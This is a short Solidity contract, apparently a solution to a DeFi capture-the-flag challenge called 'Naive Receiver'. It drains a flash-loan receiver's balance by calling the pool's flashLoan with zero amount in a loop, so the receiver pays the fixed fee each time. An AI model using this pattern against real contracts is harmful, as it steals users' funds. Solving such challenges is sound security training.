pragma solidity ^0.8.0;

import "./INaiveReceiverLenderPool.sol";

contract Attack {
    function attack(INaiveReceiverLenderPool pool, address payable receiver)
        public
    {
        uint256 FIXED_FEE = pool.fixedFee();
        while (receiver.balance >= FIXED_FEE) {
            pool.flashLoan(receiver, 0);
        }
    }
}
